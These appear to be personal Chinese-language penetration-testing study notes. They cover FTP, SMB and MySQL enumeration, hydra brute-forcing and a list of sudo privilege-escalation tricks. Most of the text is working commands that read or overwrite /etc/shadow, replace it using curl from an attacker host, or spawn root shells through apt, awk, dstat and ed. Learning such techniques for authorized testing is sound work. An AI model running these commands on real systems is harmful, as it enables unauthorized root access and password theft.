端口信息

[TOC]

#### ftp

```
登录命令。
ftp url
```

ftp-anon:Anonymous FTP login alowed

说明可以用Anonymous登录。不需要密码。

![1710389239586](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710389239586.png)

```
get note可以获得一些信息。
```

#### smb

```
enum4linux -a 10.4.7.132
探查相关信息。
```

![1710389435195](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710389435195.png)

网上大神的裁剪方法

```
cat username1.txt | cut -d '\' -f2 | cut -d ' ' -f1 > username1.txt
```

![1710389467905](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1710389467905.png)

再使用 hydra 爆破。命令可能不一样。hydra -L是用户名，-P是密码。

```
hydra -L username1.txt -P username1.txt -e nsr 10.4.7.132 ftp

hydra -L username1.txt -P username1.txt -e nsr 10.4.7.132 ssh

```

爆破出来就可以登录。



或者

smbclient   此工具有用。

smbclient //192.168.56.103/share$

登录。

#### mysql

```
登录
mysql -uroot -用户名 -h 10.4.7.132

show databases 查看数据库。
use ...   进入。。。数据库
show tables 查看表
desc ... 查看。。。中的段
select ...,...,... from 。。。查看。。。表中的...,...,...段的值。

```

#### 139

139端口，这个端口是一个高危端口，它是永痕之蓝的常用端口之一。我们现在使用msf直接获取他的root权限。

使用msf

#### hydra

没有密码。

hydra -L user.txt -e nsr 192.168.47.142 ftp



#### sudo -l 枚举

##### 1,

sudo -V | grep version

查看sudo的版本。

在1.8之前有一个漏洞。

即执行命令

sudo -u#-1 /bin/bash



##### 2,apt

sudo -l

发现有apt

```
(root) NOPASSWD:/usr/bin/apt
```

执行如下命令

```
sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
```



##### 3，apache2

有

```
(root) NOPASSWD:/usr/bin/apache2
```

使用命令

```
sudo apache2 -f /etc/shadow
```

会报错，并带出shadow文件中的内容。

这是引号中的信息。将其复制粘贴下来。

![1711012200801](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711012200801.png)

因为到时候显示出来的时散列值需要破解。

```
sudo john xxx --wordlist=/usr/share/wordlists/rockyou.txt
```



##### 4,ash

看到

```
(root) NOPASSWD:/usr/bin/ash
```

执行

```
sudo ash
whoami
bash
```



##### 5,awk

```
(root) NOPASSWD:/usr/bin/awk
```

zx

```
sudo awk "BEGIN{system("/bin/bash")}"
```



##### 6,base64

```
(root) NOPASSWD:/usr/bin/base64
```

zx

```
 cat /etc/shadow  #发现没有权限
 Redteamnote=/etc/shadow
 sudo base64 "Redteamnote" | base64 -d
 
```

 

##### 7,bash

```
(root) NOPASSWD:/usr/bin/bash
```

zx

```
sudo bash
```





##### 8,cp

```
(root) NOPASSWD:/usr/bin/cp
```

zx

```
mkpasswd -m sha-512 123456
sudo cat /etc/passwd | grep root

```

![1711082668552](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711082668552.png)

将这个语句保存下来

![1711082902508](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711082902508.png)



##### 9.cpulimit

```
(root) NOPASSWD:/usr/bin/cpulimit
```

zx

```
sudo cpulimit -l 100 -f /bin/bash
```



##### 10,curl

这是在kali中的：

```
(root) NOPASSWD:/usr/bin/curl
```

zx

```
mkpasswd -m sha-512 123456
sudo cat /etc/shadow | grep root

```

将这个语句保存下来。

```
sudo php -S 0:80
```

靶机中的：

```
sdo curl http://kali的地址/将语句保存下来的文件。 -o /etc/shadow
```



##### 11,date

```
(root) NOPASSWD:/usr/bin/date
```

zx

```
sudo date -f /etc/shadow
```

会将shadow中的内容泄露出来.

然后破解。



##### 12，dd

```
(root) NOPASSWD:/usr/bin/dd
```

zx

```
mkpasswd -m sha-512 123456

```

![1711099166069](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711099166069.png)

将我们生成的hash与我们自己的shadow呼唤。

互换完成后的那个就是我们要植入的语句。

![1711099357761](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711099357761.png)

```
sudo '语句' | sudo dd of=/etc/shadow
```



##### 13,dstat

```
(root) NOPASSWD:/usr/bin/dstat
```

zx

```
find / -name dstat -type d 2>/dev/null
```

![1711100335357](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711100335357.png)

随便找一个文件编辑

![1711100357335](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711100357335.png)

内容为：

```
import os;os.execv("/bin/bash",["bash"])
```

zx

```
sudo dstat --python文件的名字
```

![1711100478630](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711100478630.png)

![1711100522873](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1711100522873.png)



##### 14.ed

```
(root) NOPASSWD:/usr/bin/ed
```

zx

```
sudo /usr/bin/ed
```

这时候已经在编辑了

写入

```
!/bin/bash
```

回车



15

还有很多很多

[「红队笔记」Linux提权精讲：Sudo风暴 - Sudo风暴全70讲，扫地僧级别心法，研究提权技术的同时，打磨你对linux内核的深度理解。渗透测试宝典。_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1DV4y1U7bT/?spm_id_from=333.999.0.0&vd_source=a1dd49fde9aa23ecdabbeb5beb3ee784)

